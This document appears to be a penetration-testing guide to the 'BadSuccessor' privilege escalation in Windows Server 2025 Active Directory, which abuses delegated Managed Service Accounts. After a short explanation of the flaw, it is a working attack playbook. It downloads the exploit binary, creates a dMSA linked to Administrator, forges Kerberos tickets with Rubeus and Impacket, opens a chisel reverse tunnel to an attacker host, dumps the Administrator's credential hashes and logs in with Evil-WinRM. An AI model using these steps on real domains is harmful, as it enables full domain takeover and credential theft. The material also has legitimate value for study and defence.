A Delegated Managed Service Account (dMSA) is an AD principal in Windows Server 2025 designed to replace legacy service accounts by automatically inheriting their SPNs, group memberships, delegation settings, and even keys. This migration is controlled by a single attribute, `msDS-ManagedAccountPrecededByLink`, which tells the KDC which legacy account the dMSA is meant to “succeed.” When the migration state attribute `msDS-DelegatedMSAState` is set to value 2, the KDC treats the dMSA as the full successor of that predecessor.

The vulnerability comes from the fact that if an attacker can write `msDS-ManagedAccountPrecededByLink`, they can point a dMSA at any victim account, including Domain Admins. The KDC will then build a PAC for the dMSA that contains every SID and group of the chosen predecessor, effectively granting the attacker the victim’s entire identity. This results in full privilege escalation because the KDC itself issues cryptographically valid Kerberos tickets that impersonate the targeted account.


---


## Requirements to attack

1. **At least one Windows Server 2025 DC** so that the dMSA LDAP class and KDC logic exist.
2. **Any object‑creation or attribute‑write rights on an OU** (any OU) – e.g. `Create msDS‑DelegatedManagedServiceAccount` or simply **Create All Child Objects**. Akamai found 91 % of real‑world tenants grant such “benign” OU permissions to non‑admins.
3. Ability to run tooling (PowerShell/Rubeus) from any domain‑joined host to request Kerberos tickets.  

    _No control over the victim user is required; the attack never touches the target account directly._


---


## BadSuccessor exploitation

#### From Powershell

To perform the exploitation, you can download the `.exe` binary from

```bash
wget https://github.com/ibaiC/BadSuccessor/blob/main/BadSuccessor/obj/Debug/BadSuccessor.exe
```

1. **Check if the domain is vulnerable to BadSuccessor**

This command extracts the vulnerable OUs.  

```powershell
.\BadSuccessor.exe find
```

2. **Create a dMSA you control** 

This step creates a delegated Managed Service Account (dMSA) in an OU you control and links it to the Administrator account. The purpose is to inherit Administrator privileges through the dMSA object.

```powershell
.\BadSuccessor.exe escalate `
  -targetOU "OU=<OrganizationalUnit>,DC=<Domain>,DC=<TLD>" `
  -dmsa <DMSA_Name> `
  -targetUser "CN=<TargetUser>,CN=Users,DC=<Domain>,DC=<TLD>" `
  -dnshostname <DMSA_Hostname_FQDN> `
  -user <DelegatedUser> `
  -dc-ip <DomainController_IP>
```


3. **Request a TGT for your controlled user**

Next, you need to request a Ticket Granting Ticket (TGT) for your own user account. This is necessary to authenticate against the domain and inject the ticket into your current session for later use.

- `/user:` → The username of the account you want to request a TGT for (e.g. `attackeruser`).
- `/password:` → The plaintext password of that account (e.g. `SuperSecret123!`).
- `/domain:` → The Active Directory domain name (e.g. `domain.local`).
- `/dc:` → The Domain Controller’s FQDN or IP address (e.g. `dc01.eighteen.htb` or `10.10.11.95`).

```powershell
.\Rubeus.exe asktgt `
  /user:<AttackerUser> `
  /password:<AttackerPassword> `
  /domain:<DomainName> `
  /dc:<DomainControllerFQDN> `
  /enctype:aes256 `
  /nowrap `
  /ptt
```

4. **Request a TGT for the dMSA** 

Ask for a service ticket (TGS) for the `krbtgt` service using the dMSA you created. The reason is to leverage the dMSA’s inherited Administrator privileges and obtain a Kerberos ticket that reflects elevated rights.

```powershell
.\Rubeus.exe asktgs `
  /targetuser:<NewDMSAName>$ `
  /service:krbtgt/<DomainNameUppercase> `
  /opsec `
  /dmsa `
  /nowrap `
  /ptt `
  /domain:<DomainName> `
  /dc:<DomainControllerFQDN> `
  /ticket:<TGTFileOrHandle>
```

5. **Request a TGS for the Domain Controller** 

Finally, you request a TGS for the CIFS service on the Domain Controller. This is done to gain privileged access to SMB file shares on the DC, confirming that the escalation worked and allowing direct interaction with sensitive resources.

```powershell
.\Rubeus.exe asktgs `
  /user:<DMSA_Account$> `
  /service:cifs/<DomainControllerFQDN> `
  /opsec `
  /dmsa `
  /nowrap `
  /ptt `
  /ticket:<Base64_TGT>
```

6. **Verify the access**

Finally, confirm that the escalation worked by checking tickets and accessing restricted resources.

- Verify tickets in memory:
```powershell
klist
```

- Access restricted resources
```powershell
dir \\<DomainControllerFQDN>\Users\Administrator
```



#### From Kali

1. **Create dMSA successor (Windows / PowerShell)**

- Use **BadSuccessor** to create a Delegated Managed Service Account (dMSA) and link it to a privileged account:

```powershell
BadSuccessor -mode exploit `
  -Path "OU=<OrganizationalUnit>,DC=<Domain>,DC=<TLD>" `
  -Name "<DMSA_Name>" `
  -DelegatedAdmin "<DelegatedUser>" `
  -DelegateTarget "<TargetUser>" `
  -domain "<DomainName>"
```


2. **Establish SOCKS tunnel (Windows / PowerShell)**

- On the compromised host (client):

```powershell
./chisel.exe client <Attacker_IP>:<Port> R:<LocalPort>:socks
```

- On the attacker machine (kali):

```powershell
./chisel.exe server --socks5 -p <Port> --reverse
```


3. **Fix clock skew (Kali)**

- Synchronize time with the Domain Controller:

```bash
python3 fixtime.py -u http://<DC_IP>
```


4. **Request S4U2Self ticket (Kali)**

- Ask for a Kerberos ticket impersonating the dMSA:

```bash
proxychains4 python3 getST.py '<Domain>/<DelegatedUser>:<Password>' \
  -impersonate '<DMSA_Name>$' \
  -self \
  -dc-ip <DC_IP>
```

- Export the resulting cache:

```bash
export KRB5CCNAME='<DMSA_Name>$@krbtgt_<DOMAIN_UPPER>@<DOMAIN_UPPER>.ccache'
```


5. **Request service ticket for CIFS (Kali)**

- Use Impacket to get a CIFS ticket for the DC:

```bash
proxychains4 impacket-getST -k -no-pass \
  -spn cifs/<DC_FQDN> '<Domain>/<DMSA_Name>$'
```

- Export again:

```bash
export KRB5CCNAME='<DMSA_Name>$@cifs_<DC_FQDN>@<DOMAIN_UPPER>.ccache'
```


6. **Re‑sync time if needed**

- If Kerberos errors appear, run:

```bash
python3 fixtime.py -u http://<DC_IP>
```


7. **Dump secrets (Kali)**

- Extract Administrator secrets with Impacket:

```bash
proxychains4 -q impacket-secretsdump -k -no-pass <DC_FQDN> \
  -just-dc-user <TargetUser> -dc-ip <DC_IP>
```


8. **Confirm access (Kali)**

- Log in with Evil‑WinRM:

```bash
evil-winrm -i <DC_FQDN> -u <TargetUser> -H '<NTLM_Hash>'
```

